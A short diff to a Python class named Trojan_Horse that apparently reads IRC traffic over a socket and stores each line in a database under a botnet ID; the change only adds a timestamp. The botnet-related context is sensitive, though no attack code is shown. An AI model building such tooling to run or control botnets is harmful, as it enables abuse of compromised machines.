@@ -1,6 +1,7 @@
 import socket
 import time
 import modules.database as database
+import datetime
 
 class Trojan_Horse():
  
@@ -53,6 +54,7 @@ class Trojan_Horse():
                 readbuffer = temp.pop()
                 for line in temp:
                     line = line.rstrip()
+                    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                     self.msg_db.insert(botnet_id, timestamp, line)
                     self.line = line.split()
                     # The IRC table tennis 
